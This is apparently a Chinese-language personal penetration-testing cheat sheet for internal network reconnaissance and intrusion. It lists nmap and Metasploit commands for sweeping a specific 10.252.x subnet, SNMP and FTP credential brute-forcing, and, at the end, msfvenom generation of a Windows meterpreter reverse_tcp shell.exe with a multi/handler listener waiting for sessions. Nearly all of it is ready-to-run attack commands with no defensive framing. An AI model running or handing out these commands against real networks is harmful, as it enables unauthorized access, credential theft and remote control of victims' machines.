1.获取存活主机
```
1.nmap
[ 001 ]sudo nmap -sU --script nbstat.nse -p137 10.252.21.0/22 -T4 ==>比[ 003 ]全面
之后建议修改重定向到文件 sudo nmap -sU --script nbstat.nse -p137 10.252.21.0/22 -T4>00.log

[ 004 ]sudo nmap -sU --script snmp-brute 10.252.21.0/22 -T4>00.log ==>很长时间
# -sU: 这是nmap的选项之一，表示进行UDP扫描。SNMP协议通常使用UDP进行通信(s是nmap命令的一个选项，用于指定要执行的扫描类型。)
# -T4: 这是nmap的选项之一，表示设置扫描速度。-T4 表示使用较高的扫描速度（4级），以更快地完成扫描
# -sS：TCP SYN扫描，也称为半开放扫描。它发送TCP SYN包到目标主机的端口，根据响应来判断端口的开放状态。
# -sU：UDP扫描。它发送UDP数据包到目标主机的端口，并根据响应来判断端口的开放状态。UDP扫描通常用于探测UDP协议上运行的服务。
# -sA：ACK扫描。它发送TCP ACK包到目标主机的端口，并根据响应来判断端口的状态。ACK扫描通常用于绕过防火墙和过滤规则，探测端口的过滤策略。

[ 006 ]sudo nmap -sP -PI 10.252.21.0/22 -T4
# 是TCP/IP协议族的一个子协议，用于在IP主机、路由器之间传递控制消息。控制消息是指网络通不通、主机是否可达、路由是否可用等网络本身的消息


2.msfconsole
search scanner ==> search arp_scanner
[ 002 ]use post/windows/gather/arp_scanner

[ 003 ]use auxiliary/scanner/netbios/nbname ==>比[ 001 ]好看
# 所以在局域网内部使用NetBIOS协议可以方便地实现消息通信及资源的共享。
    show options
    set RHOSTS 10.252.21.0/22
    run
    
[ 005 ]use auxiliary/scanner/snmp/snmp_enum ==>对应[ 004 ]
# SNMP主要用于网络设备的管理。SNMP协议主要由两大部分构成：SNMP管理站和SNMP代理
    show options
    set THREADS 10
    set RHOSTS 10.252.21.0/22
    run

[ 007 ]use scanner/smb/smb_version
# 对于发现的,继续 [ 008 ]sudo nmap -sU -sS --script smb-enum-shares.nse -p {port} {ip}
# 基于SMB发现内网存活主机
# 10.252.20.10:445 sudo nmap -sU -sS --script smb-enum-shares.nse -p 445 10.252.20.10 ==>没什么用

[ 009 ]search scanner type:auxiliary 

[ 010 ]use auxiliary/scanner/http/http_version
# 基于scanner/http/http_version发现HTTP服务

[ 011 ]use auxiliary/scanner/smb/smb_version
# 基于scanner/smb/smb_version发现SMB服务

[ 012 ]use auxiliary/scanner/ftp/ftp_version
# 基于scanner/ftp/ftp_version发现FTP服务

[013 ]use auxiliary/scanner/discovery/arp_sweep
# 基于scanner/discovery/arp_sweep发现内网存活主机

[ 014 ]use auxiliary/scanner/discovery/udp_sweep
# 基于scanner/discovery/udp_sweep发现内网存活主机
auxiliary/scanner/netbios/nbname 
auxiliary/scanner/http/title
auxiliary/scanner/db2/db2_version 
auxiliary/scanner/portscan/ack
auxiliary/scanner/portscan/tcp

[ 015 ] PowerShell -Command "[System.Data.Sql.SqlDataSourceEnumerator]::Instance.GetDataSources()"
# 基于SqlDataSourceEnumerator发现内网存活主机
```
2.js快速启动服务器
```
npm install -g anywhere
anywhere.cmd
```

3.尝试ftp攻击
```
search type:auxiliary ftp
先扫描:use auxiliary/scanner/ftp/ftp_version
use auxiliary/scanner/ftp/ftp_login
```
4.payload生成
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe

use exploit/multi/handler
set PAYLOAD <Payload name>
set LHOST <LHOST value>
set LPORT <LPORT value>
set ExitOnSession false
exploit -j -z
```